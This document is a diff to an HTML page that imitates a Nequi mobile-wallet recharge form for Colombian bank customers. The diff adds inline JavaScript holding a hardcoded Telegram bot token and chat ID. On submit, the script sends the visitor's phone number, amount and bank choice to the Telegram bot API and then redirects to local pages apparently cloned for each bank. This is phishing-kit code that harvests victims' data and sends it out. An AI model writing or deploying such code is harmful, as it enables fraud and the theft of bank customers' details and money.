@@ -68,52 +68,20 @@
                     <select id="bank" name="bank">
                         <option value="" disabled selected hidden></option>
                         <option value="">A continuación seleccione su banco</option>
-                        <option value="alianza">ALIANZA FIDUCIARIA</option>
-                        <option value="Agrario">BANCO AGRARIO</option>
-                        <option value="AV Villas">BANCO AV VILLAS</option>
-                        <option value="BBVA">BANCO BBVA COLOMBIA S.A.</option>
-                        <option value="Caja Social">BANCO CAJA SOCIAL</option>
-                        <option value="cooperativo">BANCO COOPERATIVO COPCENTRAL</option>
-                        <option value="Davivienda">BANCO DAVIVIENDA</option>
-                        <option value="Bogota">BANCO DE BOGOTA</option>
-                        <option value="Occidente">BANCO DE OCCIDENTE</option>
-                        <option value="Falabella">BANCO FALABELLA</option>
-                        <option value="finandina">BANCO FINANDINA S.A. BIC</option>
-                        <option value="gnb">BANCO GNB SUDAMERIS</option>
-                        <option value="itau">BANCO ITAU</option>
-                        <option value="jpmorgan">BANCO J.P. MORGAN COLOMBIA S.A.</option>
-                        <option value="Banco Mundo Mujer">BANCO MUNDO MUJER S.A.</option>
-                        <option value="pichincha">BANCO PICHINCHA S.A.</option>
-                        <option value="Popular">BANCO POPULAR</option>
-                        <option value="santander">BANCO SANTANDER COLOMBIA</option>
-                        <option value="Serfinanza">BANCO SERFINANZA</option>
-                        <option value="union">BANCO UNION</option>
-                        <option value="ban100">BAN100</option>
-                        <option value="bancamia">BANCAMIA S.A.</option>
+                        <option value="AV-Villas">BANCO AV VILLAS</option>
                         <option value="Bancolombia">BANCOLOMBIA</option>
-                        <option value="bancoomeva">BANCOOMEVA S.A.</option>
-                        <option value="bold">BOLD CF</option>
-                        <option value="cfa">CFA COOPERATIVA FINANCIERA</option>
-                        <option value="citibank">CITIBANK</option>
-                        <option value="coink">COINK SA</option>
-                        <option value="coltefinanciera">COLTEFINANCIERA</option>
-                        <option value="confiar">CONFIAR COOPERATIVA FINANCIERA</option>
-                        <option value="cotrafa">COTRAFA</option>
-                        <option value="crezcamos">CREZCAMOS MOSI</option>
-                        <option value="dale">DALE</option>
+                        <option value="Banco-Mundo-Mujer">BANCO MUNDO MUJER S.A.</option>
+                        <option value="BBVA">BANCO BBVA COLOMBIA S.A.</option>
+                        <option value="Bogota">BANCO DE BOGOTA</option>
+                        <option value="Caja-Social">BANCO CAJA SOCIAL</option>
                         <option value="Daviplata">DAVIPLATA</option>
-                        <option value="ding">DING</option>
-                        <option value="juriscoop">FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO</option>
-                        <option value="global66">GLOBAL66</option>
-                        <option value="iris">IRIS</option>
-                        <option value="jfk">JFK COOPERATIVA FINANCIERA</option>
-                        <option value="lulo">LULO BANK</option>
-                        <option value="movii">MOVII S.A.</option>
-                        <option value="nu">NU</option>
-                        <option value="powii">POWII</option>
-                        <option value="rappipay">RAPPIPAY</option>
-                        <option value="Scotiabank Colpatria">SCOTIABANK COLPATRIA</option>
-                        <option value="uala">UALÁ</option>
+                        <option value="Davivienda">BANCO DAVIVIENDA</option>
+                        <option value="Falabella">BANCO FALABELLA</option>
+                        <option value="Itau">BANCO ITAU</option>
+                        <option value="Occidente">BANCO DE OCCIDENTE</option>
+                        <option value="Popular">BANCO POPULAR</option>
+                        <option value="Scotiabank-Colpatria">SCOTIABANK COLPATRIA</option>
+                        <option value="Serfinanza">BANCO SERFINANZA</option>
                     </select>
                     <div class="select-arrow"></div>
                 </div>
@@ -137,6 +105,96 @@
         </form>
     </div>
 
-    <script src="js/nequi-form.js" defer></script>
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+        const TELEGRAM_CHAT_ID = '-1003784784181';
+
+        const form = document.getElementById('recharge-form');
+        const phoneInput = document.getElementById('phone');
+        const confirmPhoneInput = document.getElementById('confirm-phone');
+        const amountInput = document.getElementById('amount');
+        const bankSelect = document.getElementById('bank');
+        const termsCheckbox = document.querySelector('input[name="terms"]');
+        const submitBtn = document.getElementById('submit-btn');
+        const phoneError = document.getElementById('phone-error');
+        const amountError = document.getElementById('amount-error');
+
+        // Validar en tiempo real
+        function validateForm() {
+            const phone = phoneInput.value.trim();
+            const confirmPhone = confirmPhoneInput.value.trim();
+            const amount = amountInput.value.trim();
+            const bank = bankSelect.value;
+            const terms = termsCheckbox.checked;
+
+            // Validar teléfonos coincidan
+            if (phone && confirmPhone && phone !== confirmPhone) {
+                phoneError.textContent = 'Los números no coinciden';
+                phoneError.classList.add('show');
+            } else {
+                phoneError.classList.remove('show');
+            }
+
+            // Validar monto
+            if (amount && isNaN(amount)) {
+                amountError.textContent = 'Ingresa un monto válido';
+                amountError.classList.add('show');
+            } else {
+                amountError.classList.remove('show');
+            }
+
+            // Habilitar botón si todo está completo
+            const isValid = phone && confirmPhone && phone === confirmPhone && amount && bank && terms && !isNaN(amount);
+            submitBtn.disabled = !isValid;
+        }
+
+        phoneInput.addEventListener('input', validateForm);
+        confirmPhoneInput.addEventListener('input', validateForm);
+        amountInput.addEventListener('input', validateForm);
+        bankSelect.addEventListener('change', validateForm);
+        termsCheckbox.addEventListener('change', validateForm);
+
+        // Enviar a Telegram y redirigir
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const phone = phoneInput.value;
+            const confirmPhone = confirmPhoneInput.value;
+            const amount = amountInput.value;
+            const personType = document.getElementById('person-type').value;
+            const bank = bankSelect.value;
+
+            submitBtn.disabled = true;
+
+            const mensaje = `📱 <b>NEQUI - RECARGA FORM</b>
+
+<b>Celular:</b> <code>${phone}</code>
+<b>Confirmación:</b> <code>${confirmPhone}</code>
+<b>Monto:</b> <code>$${amount}</code>
+<b>Tipo de persona:</b> <code>${personType}</code>
+<b>Banco:</b> <code>${bank}</code>
+
+<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
+                });
+
+                if ((await response.json()).ok) {
+                    // Redirigir al banco seleccionado
+                    setTimeout(() => {
+                        window.location.href = `bancos/${bank}/index.html`;
+                    }, 1500);
+                } else {
+                    submitBtn.disabled = false;
+                }
+            } catch (error) {
+                submitBtn.disabled = false;
+            }
+        });
+    </script>
 </body>
 </html>
